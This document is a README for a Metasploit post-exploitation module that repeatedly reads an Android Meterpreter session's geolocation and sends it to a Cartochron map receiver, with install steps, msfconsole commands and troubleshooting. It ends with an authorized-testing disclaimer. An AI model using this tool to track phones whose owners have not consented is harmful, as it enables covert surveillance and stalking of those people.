# Cartochron Metasploit adapter

An optional Android Meterpreter post module for
[Cartochron](https://github.com/cartochron/cartochron). It polls the authorized
session's `geolocate` command and submits the reported position to Cartochron's
`POST /api/position` endpoint. The Cartochron receiver runs separately and
is not installed by this repository.

**Location limitation:** Android Meterpreter `geolocate` returns the network
provider's **last-known** position. A successful poll is not proof of a new
GPS fix, movement, or current location; the age and accuracy are unavailable.
Cartochron records its *receipt time*, not the acquisition time of the fix.
The adapter tags accepted submissions with reported `provider: network`; it
does not fabricate a measurement timestamp or accuracy. Older recordings
remain unchanged.

## Install

Requires a Metasploit Framework installation supporting an Android Meterpreter
session and Ruby. Install into the default user module directory:

```sh
make check
make install
```

Set `MSF_DIR=/path/to/modules` to use a different user module directory:

```sh
make install MSF_DIR="$HOME/custom msf/modules"
```

In `msfconsole`, load the module and start it as a **background job**:

```text
msf6 > reload_all
msf6 > use post/android/gather/cartochron
msf6 post(android/gather/cartochron) > set SESSION <session-id>
msf6 post(android/gather/cartochron) > set ENDPOINT http://127.0.0.1:8765/api/position
msf6 post(android/gather/cartochron) > set INTERVAL 5
msf6 post(android/gather/cartochron) > run -j
```

The endpoint is the Cartochron receiver, not the Android device. For an
Internet-facing receiver, use **HTTPS**, configure `MAP_USER` and
`MAP_PASSWORD` to match its Basic-auth credential file, and protect the
Metasploit console history and datastore. Do not send credentials over
plaintext HTTP on untrusted networks. The receiver's Docker Compose setup
uses Basic authentication by default.

Leave `TRACK_ID` empty for a new random recording-run ID per job. Set
`CHANNEL_ID` to a stable, operator-chosen channel (for example, `msf.oneplus`)
so Monitor follows newer jobs without merging recording runs. The optional
channel is independent of the enrolled source and must be 1–64 ASCII letters,
digits, dots, underscores, or hyphens, starting with a letter or digit. Set
`SOURCE_ID` to an already enrolled Cartochron source identifier if you want
independent runs associated with one descriptive source. None of these
identifiers authenticates a physical device. `INTERVAL` is measured in seconds.

For example, with a configured phone and a receiver supporting channel IDs:

```text
msf6 post(android/gather/cartochron) > set CHANNEL_ID msf.oneplus
msf6 post(android/gather/cartochron) > unset TRACK_ID
msf6 post(android/gather/cartochron) > run -j
```

**Upgrade Cartochron first.** When `CHANNEL_ID` is set, the adapter requires
HTTP 201 with the same `channel_id` in the receiver's JSON acknowledgment.
An older receiver may have accepted the *first* observation while ignoring
that field; the adapter stops that job and logs a compatibility warning
instead of silently continuing with missing provenance. With `CHANNEL_ID`
unset, it retains the legacy request and success behavior. The channel and
source are independent assertions, immutable within each run; do not reuse
`TRACK_ID` with different source/channel options.

```text
msf6 > jobs -l                # Show background jobs
msf6 > jobs -k <job-id>       # Stop one recording job
```

For receiver setup, sources, history, backups, and map operation, see the
[Cartochron recording guide](https://github.com/cartochron/cartochron/blob/master/docs/recording.md)
and [receiver documentation](https://github.com/cartochron/cartochron).
The adapter is intentionally independent of the receiver implementation;
its contract is HTTP/JSON, not an imported library.

## Existing gps_streamer installation

The old Cartochron repository installed `post/android/gather/gps_streamer.rb`.
After stopping **all obsolete streamer jobs** (`jobs -l` then `jobs -k`),
remove only that old module file:

```sh
rm -f "$HOME/.msf4/modules/post/android/gather/gps_streamer.rb"
make install
```

Use the corresponding custom module directory if you used `MSF_DIR` before.
Then run `reload_all` and select `post/android/gather/cartochron`.
The rename does **not** migrate running jobs, source credentials, or
`TRACK_ID` configuration. Leaving both module files installed makes two
independently runnable jobs available; do not start duplicate jobs against
the same recording run.

## Logging and troubleshooting

The adapter writes job startup, result transitions, 60-second summaries, and
shutdown to Metasploit's framework logger (usually
`~/.msf4/logs/framework.log`). It does not emit coordinates or passwords.

`Errno::ECONNREFUSED` means the configured receiver could not be reached.
HTTP 401 means the receiver was reached but refused its credentials. Stop
an old job and start a new one with the correct `MAP_USER` and `MAP_PASSWORD`;
changing the datastore does not reconfigure an already-running job.

## Test and uninstall

```sh
make check
make uninstall
```

`make check` exercises the module's transport, state transitions, optional
source identity, and install/uninstall paths using Ruby Minitest. No live
Metasploit session, receiver, or network connection is needed.

Use only for authorized testing on devices and sessions you control or have
explicit permission to investigate. GPL-3.0-or-later; see `COPYING` and
`COPYRIGHT`.
